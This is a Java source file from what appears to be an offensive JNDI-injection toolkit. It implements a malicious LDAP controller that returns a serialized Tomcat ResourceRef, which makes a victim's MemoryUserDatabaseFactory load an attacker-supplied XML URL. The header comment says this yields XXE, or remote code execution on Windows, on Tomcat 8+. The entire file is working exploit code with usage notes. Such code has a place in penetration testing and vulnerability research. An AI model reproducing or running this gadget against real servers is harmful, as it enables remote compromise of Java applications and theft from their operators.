package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 * XXE/RCE(on Windows only) via  Tomcat MemoryUserDatabaseFactory
 *
 * @see https://tttang.com/archive/1405/#toc_0x02-xxe-rce for details
 *
 * Command - URL to the HTTP server that contains the XML file.
 *
 * Requires:
 *  Tomcat 8+
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author snowyowl
 */

@LdapMapping(uri = { "/o=tomcat-user-database" })
public class TomcatMemoryUserDatabase implements LdapController {



    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with Tomcat UserDatabase");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any



        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", Config.command));
        ref.add(new StringRefAddr("readonly", "false"));

        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}